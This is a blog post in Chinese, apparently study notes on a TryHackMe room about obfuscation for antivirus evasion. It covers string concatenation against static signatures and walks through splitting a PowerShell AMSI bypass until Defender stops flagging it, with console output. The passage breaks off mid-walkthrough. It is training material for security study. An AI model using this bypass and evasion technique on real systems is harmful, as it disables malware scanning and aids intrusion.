@@ -1,0 +1,612 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM免杀学习ObfuscationPrinciples | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction混淆是检测规避方法和防止恶意软件分析的重要组成部分。 混淆最初是为了保护软件和知识产权不被窃取或复制。 虽然它仍然被广泛用于其最初的目的，但对手已将其用于恶意目的。 在这个房间里，我们将从多个角度观察混淆并分解混淆方法。眼睛的装饰图像学习目标  了解如何使用与工具无关的混淆来逃避现代检测工程  从知识产权保护理解混淆原理及其渊源  实施混淆方法来隐藏恶意功能  在开始本课程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM免杀学习ObfuscationPrinciples">
+<meta property="og:url" content="http://mikannse.space/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0ObfuscationPrinciples/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Introduction混淆是检测规避方法和防止恶意软件分析的重要组成部分。 混淆最初是为了保护软件和知识产权不被窃取或复制。 虽然它仍然被广泛用于其最初的目的，但对手已将其用于恶意目的。 在这个房间里，我们将从多个角度观察混淆并分解混淆方法。眼睛的装饰图像学习目标  了解如何使用与工具无关的混淆来逃避现代检测工程  从知识产权保护理解混淆原理及其渊源  实施混淆方法来隐藏恶意功能  在开始本课程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-04-08T12:47:11.000Z">
+<meta property="article:modified_time" content="2024-06-14T03:29:54.912Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0ObfuscationPrinciples/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THM免杀学习ObfuscationPrinciples',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-06-14 11:29:54'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THM免杀学习ObfuscationPrinciples</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-08T12:47:11.000Z" title="发表于 2024-04-08 20:47:11">2024-04-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-14T03:29:54.912Z" title="更新于 2024-06-14 11:29:54">2024-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>26分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THM免杀学习ObfuscationPrinciples"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>混淆是检测规避方法和防止恶意软件分析的重要组成部分。 混淆最初是为了保护软件和知识产权不被窃取或复制。 虽然它仍然被广泛用于其最初的目的，但对手已将其用于恶意目的。</p>
+<p>在这个房间里，我们将从多个角度观察混淆并分解混淆方法。<br>眼睛的装饰图像<br>学习目标</p>
+<pre><code> 了解如何使用与工具无关的混淆来逃避现代检测工程
+ 从知识产权保护理解混淆原理及其渊源
+ 实施混淆方法来隐藏恶意功能
+</code></pre>
+<p>在开始本课程之前，请先熟悉基本的编程逻辑和语法。 建议了解 C 和 PowerShell，但不是必需的。</p>
+<h1 id="Origins-of-Obfuscation"><a href="#Origins-of-Obfuscation" class="headerlink" title="Origins of Obfuscation"></a>Origins of Obfuscation</h1><p>混淆广泛应用于许多软件相关领域，以保护<strong>IP</strong>（<strong>I</strong>intellectual <strong>P</strong>property）和应用程序可能包含的其他专有信息。</p>
+<p>例如，流行的游戏：Minecraft 使用混淆器 <a target="_blank" rel="noopener" href="https://github.com/Guardsquare/proguard">ProGuard</a> 来混淆和最小化其 Java 类。 Minecraft 还发布了信息有限的<strong>混淆地图</strong>，作为旧的未混淆类和新的混淆类之间的转换器，以支持模组社区。</p>
+<p>这只是公开使用混淆的多种方式的一个例子。 为了记录和整理各种混淆方法，我们可以参考分层混淆：分层安全软件混淆技术的分类。 本研究论文按<strong>层</strong>组织混淆方法，类似于 OSI 模型，但针对应用程序数据流。 下图是每个分类层的完整概述。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/54c0a2415cd4fc88a55b154bf297910c.png" alt="Diagram showing the four layers of the layered obfuscation taxonomy: Code-Element Layer, Software-Component Layer, Inter-Component Layer, and Application layer"></p>
+<p>然后将每个子层分解为可以实现子层总体目标的具体方法。</p>
+<p>在这个房间里，我们将主要关注分类法的<strong>代码元素层</strong>，如下图所示。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/974cf87ce312e0885e6e8027f9c1821e.png" alt="Diagram showing sub-layers of the Code-Element Layer: Obfuscating Layout, Obfuscating Controls, Obfuscating Data, Obfuscating Methods, and Obfuscating Classes"></p>
+<p>要使用分类法，我们可以确定一个目标，然后选择适合我们要求的方法。 例如，假设我们想要混淆代码的布局，但无法修改现有代码。 在这种情况下，我们可以注入垃圾代码，按分类法总结：</p>
+<p>  “代码元素层”&gt;“混淆布局”&gt;“垃圾代码”。</p>
+<p>但这怎么可能被恶意利用呢？ 对手和恶意软件开发人员可以利用混淆来破坏签名或阻止程序分析。 在接下来的任务中，我们将讨论恶意软件混淆的两个视角，包括每个视角的目的和底层技术。</p>
+<h1 id="Obfuscation’s-Function-for-Static-Evasion"><a href="#Obfuscation’s-Function-for-Static-Evasion" class="headerlink" title="Obfuscation’s Function for Static Evasion"></a>Obfuscation’s Function for Static Evasion</h1><p>对手面临的两个更重要的安全边界是<strong>防病毒引擎</strong>和<strong>EDR</strong>（<strong>E</strong>ndpoint <strong>D</strong>etection &amp; <strong>R</strong>esponse）解决方案 。 正如<a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtoav">防病毒室简介</a>中所述，两个平台都将利用广泛的已知签名数据库，称为<strong>静态</strong>签名以及<strong>考虑应用程序行为的启发式</strong>签名。</p>
+<p>为了逃避签名，攻击者可以利用广泛的逻辑和语法规则来实施混淆。 这通常是通过滥用数据混淆实践来实现的，这些做法在合法应用程序中隐藏重要的可识别信息。</p>
+<p>前面提到的白皮书：<a target="_blank" rel="noopener" href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">分层混淆分类法</a>，在 <strong>code-element</strong> 层很好地总结了这些实践。 下面是<strong>混淆数据</strong>子层<strong>中的分类法涵盖的方法表。</strong></p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/dacc392986614d70d6dc982111077063.png" alt="Diagram showing the objectives of the Obfuscating Data Sub-Layer: Array Transformation, Data Encoding, Data Procedurization, and Data Splitting/Merging">**</p>
+<table>
+<thead>
+<tr>
+<th><strong>混淆方法</strong></th>
+<th><strong>目的</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数组变换</td>
+<td>通过拆分、合并、折叠和展平来转换数组</td>
+</tr>
+<tr>
+<td>数据编码</td>
+<td>使用数学函数或密码对数据进行编码</td>
+</tr>
+<tr>
+<td>数据程序化</td>
+<td>用过程调用替代静态数据</td>
+</tr>
+<tr>
+<td>数据分割/合并</td>
+<td>将一个变量的信息分配到多个新变量</td>
+</tr>
+</tbody></table>
+<p>在接下来的任务中，我们将主要关注<strong>数据拆分/合并</strong>； 由于静态签名较弱，我们在初始混淆时一般只需要关注这一方面。</p>
+<p>查看 Encoding/Packing/Binder/Crypters room 以获取有关 <strong>数据编码</strong> 的更多信息，并查看 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/signatureevasion">Signature Evasion room</a> 以获取有关 <strong>数据程序化的更多信息 <strong>和</strong>转变</strong>。</p>
+<h1 id="Object-Concatenation"><a href="#Object-Concatenation" class="headerlink" title="Object Concatenation"></a>Object Concatenation</h1><p><strong>连接</strong>是一种常见的编程概念，它将两个单独的对象组合成一个对象，例如字符串。</p>
+<p>预定义的运算符定义了在何处进行串联以组合两个独立的对象。 下面是 Python 中字符串连接的通用示例。</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A = <span class="string">"Hello "</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>B = <span class="string">"THM"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>C = A + B</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(C)</span><br><span class="line">Hello THM</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>根据程序中使用的语言，可能存在不同或多个可用于串联的预定义运算符。 下面是一个常见语言及其相应预定义运算符的小表。</p>
+<table>
+<thead>
+<tr>
+<th>**Language **</th>
+<th><strong>Concatenation Operator</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Python</td>
+<td>“**+**”</td>
+</tr>
+<tr>
+<td>PowerShell</td>
+<td>“**+<strong>”, ”</strong>,<strong>”, ”</strong>$**”, or no operator at all</td>
+</tr>
+<tr>
+<td>C#</td>
+<td>“**+<strong>”, “</strong>String.Join<strong>”, “</strong>String.Concat**”</td>
+</tr>
+<tr>
+<td>C</td>
+<td>“<strong>strcat</strong>”</td>
+</tr>
+<tr>
+<td>C++</td>
+<td>“**+<strong>”, “</strong>append**”</td>
+</tr>
+</tbody></table>
+<p>前面提到的白皮书：<a target="_blank" rel="noopener" href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">分层混淆分类法</a>，在<strong>code-element</strong>层的<strong>下很好地总结了这些实践 数据分割/合并</strong>子层。</p>
+<hr>
+<p>这对攻击者意味着什么？ 连接可以为多个向量打开大门，以修改签名或操纵应用程序的其他方面。 恶意软件中最常见的串联示例是破坏目标<strong>静态签名</strong>，如<a target="_blank" rel="noopener" href="https://tryhackme.com/room/signatureevasion">签名规避室</a>中所述。 攻击者还可以先发制人地使用它来分解程序的所有对象，并尝试立即删除所有签名而不追捕它们，这在任务 9 中介绍的混淆器中很常见。</p>
+<p>下面我们将观察静态 <strong>Yara</strong> 规则并尝试使用串联来规避静态签名。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">rule ExampleRule</span><br><span class="line">{</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$text_string</span> = <span class="string">"AmsiScanBuffer"</span></span><br><span class="line">        <span class="variable">$hex_string</span> = { B8 <span class="number">57</span> <span class="number">00</span> <span class="number">07</span> <span class="number">80</span> C3 }</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$my_text_string</span> or <span class="variable">$my_hex_string</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当使用 Yara 扫描已编译的二进制文件时，如果存在定义的字符串，它将创建一个积极的警报/检测。 使用串联，字符串在功能上可以相同，但在扫描时将显示为两个独立的字符串，从而不会产生警报。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">IntPtr ASBPtr = GetProcAddress(TargetDLL, <span class="string">"AmsiScanBuffer"</span>); </span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">IntPtr ASBPtr = GetProcAddress(TargetDLL, <span class="string">"Amsi"</span> + <span class="string">"Scan"</span> + <span class="string">"Buffer"</span>); </span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果使用 Yara 规则扫描第二个代码块，则不会有警报！</p>
+<p>从串联扩展，攻击者还可以使用<strong>非解释字符</strong>来破坏或混淆静态签名。 这些可以独立使用或串联使用，具体取决于签名的强度/实现。 下表列出了我们可以利用的一些常见的非解释字符。</p>
+<table>
+<thead>
+<tr>
+<th>**Character **</th>
+<th>**Purpose **</th>
+<th><strong>Example</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Breaks</td>
+<td>Break a single string into multiple sub strings and combine them</td>
+<td><code>('co'+'ffe'+'e')</code></td>
+</tr>
+<tr>
+<td>Reorders</td>
+<td>Reorder a string’s components</td>
+<td><code>('{1}{0}'-f'ffee','co')</code></td>
+</tr>
+<tr>
+<td>Whitespace</td>
+<td>包括未解释的空白</td>
+<td><code>.( 'Ne' +'w-Ob' + 'ject')</code></td>
+</tr>
+<tr>
+<td>Ticks</td>
+<td>包括未解释的刻度</td>
+<td><code>d</code>own<code>LoAd</code>Stri<code>ng</code></td>
+</tr>
+<tr>
+<td>Random Case</td>
+<td>令牌通常不区分大小写，可以是任意大小写</td>
+<td><code>dOwnLoAdsTRing</code></td>
+</tr>
+</tbody></table>
+<hr>
+<p>使用您在整个任务中积累的知识，混淆以下 PowerShell 片段，直到它逃避 Defender 的检测。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.AmsiUtils'</span>).GetField(<span class="string">'amsiInitFailed'</span>,<span class="string">'NonPublic,Static'</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为了帮助您入门，我们建议分解代码的每个部分并观察它如何交互或被检测。 然后，您可以打破独立部分中存在的签名，并向其中添加另一个部分，直到获得干净的代码片段。</p>
+<p>一旦您认为您的代码片段已被充分混淆，请将其提交到网络服务器“<a target="_blank" rel="noopener" href="http://10.10.36.78”;/">http://10.10.36.78”；</a> 如果成功，弹出窗口中将出现一个标志。</p>
+<p>如果您仍然遇到困难，我们在下面提供了解决方案的演练。</p>
+<p>要开始尝试清理此代码片段，我们需要对其进行分解并了解警报的来源。</p>
+<p>我们可以破坏每个 cmdlet 所在的代码片段（<code>GetField</code>、<code>SetValue</code>）</p>
+<ol>
+<li><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')</code></li>
+<li><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')</code></li>
+<li><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></li>
+</ol>
+<p>让我们执行第一个代码片段，看看 PowerShell 返回什么。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> M:\\&gt; [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.AmsiUtils'</span>)</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.AmsiUtils'</span>)</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">This script contains malicious content and has been blocked by your antivirus software.</span><br><span class="line">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException</span><br><span class="line">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这没什么奇怪的……我们可以通过分解 .NET 程序集并查看哪个部分导致警报来进一步分解此片段。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> M:\\&gt; [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System'</span>)</span><br><span class="line"><span class="built_in">PS</span> M:\\&gt; [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management'</span>)</span><br><span class="line"><span class="built_in">PS</span> M:\\&gt; [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation'</span>)</span><br><span class="line"><span class="built_in">PS</span> M:\\&gt; [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.AmsiUtils'</span>)</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.AmsiUtils'</span>)</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">This script contains malicious content and has been blocked by your antivirus software.</span><br><span class="line">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException</span><br><span class="line">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们现在知道“AmsiUtils”直接导致了警报。 接下来，我们可以通过串联来将其分解并尝试使该部分变得干净。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> M:\\&gt; [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.'</span>+<span class="string">'Amsi'</span>+<span class="string">'Utils'</span>)</span><br><span class="line"></span><br><span class="line">IsPublic IsSerial Name                                     BaseType</span><br><span class="line"><span class="literal">--------</span> <span class="literal">--------</span> <span class="literal">----</span>                                     <span class="literal">--------</span></span><br><span class="line">False    False    AmsiUtils                                System.Object</span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功！ 现在我们可以将下一个代码片段附加到第一个代码片段的干净版本中并执行它。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> M:\\&gt; [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.'</span>+<span class="string">'Amsi'</span>+<span class="string">'Utils'</span>).GetField(<span class="string">'amsiInitFailed'</span>,<span class="string">'NonPublic,Static'</span>)</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.'</span>+<span class="string">'Amsi'</span>+<span class="string">'Utils'</span> ...</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">This script contains malicious content and has been blocked by your antivirus software.</span><br><span class="line">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException</span><br><span class="line">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在这个片段可能更难追踪…… 凭借对 PowerShell 的一些先验知识，我们可以假设“NonPublic”和“Static”都是非常标准的，不会对签名做出贡献。 我们可以假设 Defender 正在警告“amsiInitFailed”并尝试拆分它。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> M:\\&gt; [<span class="type">Ref</span>].Assembly.GetType(<span class="string">'System.Management.Automation.'</span>+<span class="string">'Amsi'</span>+<span class="string">'Utils'</span>).GetField(<span class="string">'amsi'</span>+<span class="string">'Init'</span>+<span class="string">'Failed'</span>,<span class="string">'No'</span>+<span class="string">'nPublic,S'</span>+<span class="string">'tatic'</span>)</span><br><span class="line"></span><br><span class="line">Name                   : amsiInitFailed</span><br><span class="line">MetadataToken          : <span class="number">67114384</span></span><br><span class="line">[<span class="type">snip</span>]</span><br><span class="line">...</span><br><span class="line">[<span class="type">snip</span>]</span><br><span class="line">IsSecurityTransparent  : False</span><br><span class="line">CustomAttributes       : {}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功！ 现在我们可以将下一个代码片段附加到第一个和第二个代码片段的干净版本中并执行它。</p>
